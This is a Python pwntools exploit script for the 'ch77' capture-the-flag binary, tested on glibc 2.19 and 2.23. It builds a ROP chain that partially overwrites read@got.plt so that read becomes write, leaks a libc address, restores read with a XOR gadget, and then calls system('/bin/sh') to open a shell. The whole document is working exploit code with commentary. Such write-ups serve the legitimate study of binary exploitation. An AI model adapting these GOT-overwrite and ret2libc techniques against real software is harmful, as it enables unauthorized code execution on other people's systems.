# ch77 exploit without using ret2_dlresolve
# Tested on libc 2.19 and 2.23.
# Written by @socialkas

# This binary is supossed to be solved using the ret2_dlresolve technique by faking Sym and Rel
# structures on &workaround (.bss section) to make dl_resolve resolve and call system(). 
# No leaks necessary here, no need to know server's libc6 version either.
#
# This exploit, however, abuses the following concept: on libc6 2.23 and 2.19 (not sure about other versions
# prior to 2.24), write and read are only 0x70 bytes apart. So it is feasible to overwrite just the LSB
# of read@got.plt, because this offset never changes with ASLR. We can do that because with this
# binary we have a write-what-where primitive by abusing read.

# To test it, make sure to install the 32 bit of the GNU/libc6 library by running the following commands:
# dpkg --add-architecture i386
# apt-get update && apt-get install libc6:i386

# This exploit needs to know the version of the server's libc6. If the system where the binary is running on
# is the same where it was built on (readelf -p .comment ch77), then it will work flawlessly. Othwrwise, it's
# an exercise of guessing the server's libc6 version. This exploit has been tested on glibc 2.19 
# (Debian Jessie LTS) and 2.23 (Ubuntu 16.04 Xenial Xerus). It may work on glibc 2.20,2,21 and 2.22 also but 
# it does NOT work on glibc 2.24, and it won't work on modern versions of the GNU/libc probably.

from pwn import *
import sys

# Binary and libc6:
binary_name = "./ch77"
libc6       = "/lib/i386-linux-gnu/libc.so.6"

# Open the binary and the library:
b = ELF(binary_name)
l = ELF(libc6)

# Let's find out the read function's offset within libc6:
libc6_read_offset = l.symbols["read"]
print "[*] Libc6 read offset: ", hex(libc6_read_offset)

# Let's get write OFFSET too:
libc6_write_offset = l.symbols["write"]
print "[*] Libc6 write offset: ", hex(libc6_write_offset)

# -------------------------------------------------------------------------
# Useful binary addresses:
# -------------------------------------------------------------------------

# we will use these two to clean read,write args from the stack:
clean_3_args_stack = 0x080484b9										# pop esi; pop edi; pop ebp; ret
clean_4_args_stack = 0x080484b8										# pop ebx; pop esi; pop edi; pop ebp; ret

# Binary's main entry point:
binary_main  = b.symbols["main"]

binary_read_plt = b.symbols["read"]
binary_read_got = b.symbols["got.read"]
print "[*] read@plt at:", hex(binary_read_plt)
print "[*] read@got.plt at:", hex(binary_read_got)

# The workaround symbol detected by running readelf -s. The purpose of this symbol is to
# write here the fake Sym and Rel structures for a ret2dl_resolve attack. We, instead,
# will use this address as the third argument to write, later on, to put 0x90 on the CL
# register (continue reading):
binary_workaround = b.symbols["workaround"]
print "[*] Workaround at:", hex(binary_workaround)

# 24 bytes of padding before reaching EBP during our first ROP attack:
padding = 24

# We get the last byte of read,write within the libc6:
libc6_read_byte = int(hex(libc6_read_offset)[5:7],16)
libc6_write_byte = int(hex(libc6_write_offset)[5:7],16)
print "[*] Libc6 read last byte:" , hex(libc6_read_byte)
print "[*] Libc6 write last byte:" , hex(libc6_write_byte)

# Basic sanity check; for this exploit to work, the difference between write and read
# should be only on the LSB:
if int(hex(libc6_read_offset)[3:5],16) != int(hex(libc6_write_offset)[3:5],16): 
	print "[!!!] This exploit won't work at all; use ret2_dlresolve instead!!!"
	sys.exit(-1)

# We start the process:
r = process(binary_name)

#	This replaces read with write by overwriting the LSB of read@plt.
#	read(stdin,&read@got,1);
#	clean_stack_args();
rop_overwrite = 	p32(binary_read_plt) 						# read@plt
rop_overwrite +=	p32(clean_3_args_stack)						# return from read@plt; we clean read args
rop_overwrite +=	p32(0x0) + p32(binary_read_got) + p32(0x1)	# read@plt args
print "[*] Rop overwrite size: ", len(rop_overwrite)

#	This leaks libc6's write address to stdout:
#	write(stdout,&read@plt,4);
#	clean_stack_args(); 
rop_write =		p32(binary_read_plt)						# This is now a call to write.
rop_write +=	p32(clean_3_args_stack)						# return from write; we clean write args.
rop_write +=	p32(0x1) + p32(binary_read_got) + p32(0x4)	# write args: stdout,&read_plt, 4
print "[*] Rop write size: ", len(rop_write)

# This makes sure that cl holds the desired byte by calling write again with the address computed
# address that will give us the XOR key to restore read later on.
# This address will not make the program segfault. Because we are running out of space, we will take
# advantatge of a ROP that will pop into ebp our desired address (we will clean up 4 registers).
# The last argument to write is what will be popped into edi; we need a valid pointer to avoid
# segfaulting during the ROP XOR gadget:
#	write(stdout,computed_address,valid_pointer_for_edi);
rop_cl_90 =		p32(binary_read_plt)								# This is now a call to write.
rop_cl_90 +=	p32(clean_4_args_stack)								# return from write; we clean write args.
# Now, some libc6 versions have different bytes (2.19: 0x10 read 0x80 write; 2.23: 0x00 read, 0x70 write....)
xor_byte_cl =	libc6_read_byte ^ libc6_write_byte					# We XOR last byte of read with write
patch_address = 0x804a000 + xor_byte_cl								# We patch the ECX value with the right byte.
print "[*] Byte CL to XOR with:" , hex(xor_byte_cl)
print "[*] Xor patch whole address:", hex(patch_address)
rop_cl_90 +=	p32(0x1) + p32(patch_address) + p32(binary_workaround)	# write args: stdout,what we want into cl, a valid pointer for edi
print "[*] Rop cl_90 size: ", len(rop_write)

#	This restores the read function by performing a XOR of the LSB in read@got.plt with the XOR key
#	computed and put into CL.
#
rop_restore_read =		p32(0x8049ffe)						# This value will be popped into ebp
rop_restore_read +=		p32(0x080485d3)						# Restores by xoring read@plt-0xe with XOR key.
rop_restore_read +=		p32(binary_main)					# Return to main
print "[*] Rop restore read size: ", len(rop_restore_read)

# 1st ROP attack: we overwrite read with write, we leaked address, we restore read and get back to main:
exploit = "A"*padding + p32(0xdeadbeef) + rop_overwrite + rop_write + rop_cl_90 + rop_restore_read
print "[*] 1st ROP attack total exploit: ", len(exploit)
r.send(exploit)

# We need to send the byte now to overwrite the read@got with write@got:
print "[>>] Overwriting read with write:"
r.send(p8(libc6_write_byte))

# Leak write's address now (we only need 4 bytes):
leaked_write = int(r.recv(4)[::-1].encode("hex"),16)
print "[*] Leaked libc6's write: ",hex(leaked_write)

# We can now compute libc6's base address:
libc6_base_address = leaked_write - libc6_write_offset
print "[*] Libc6 base address:", hex(libc6_base_address)

# From here we can compute where system is:
libc6_system_offset = l.symbols["system"]
libc6_system = libc6_base_address + libc6_system_offset
print "[*] System at: ", hex(libc6_system)

# Exit:
libc6_exit_offset = l.symbols["exit"]
libc6_exit = libc6_base_address + libc6_exit_offset
print "[*] Exit at: ", hex(libc6_exit)

# We look for /bin/sh
bin_sh = libc6_base_address + next(l.search('/bin/sh\x00'))
print "[*] /bin/sh at: ", hex(bin_sh)

# Once read has been restored, we will receive a lot of junk data. We just discard it and go on:
print "[>>] Discarding Rop cl 0x90 junk data ..."
r.clean()
print "[*] Read has been restored."

# Once the ROP has replaced write with read once again, we can send more data
# to the program. Our new ROP will be the classic one to gain a shell:
rop_shell = 	p32(libc6_system)						# system()
rop_shell +=	p32(libc6_exit)							# we exit gracefully
rop_shell +=	p32(bin_sh)								# /bin/sh
rop_shell +=	p32(0x0)								# Argument to exit 0 (exit(0))
print "[*] Rop system size:", len(rop_shell)

# We prepare the exploit. The stack has changed considerably now, and we are 20 bytes-far away
# from controlling EIP:
exploit	= "A"*20 + rop_shell
print "[*] 2nd ROP attack total exploit: ", len(exploit)
	
# We send the exploit and interact with the new spawned shell process:
print "[>>] Spawning a shell ... "
r.send(exploit)
r.interactive()

#We close the binary and exit:
r.close()
sys.exit(0)
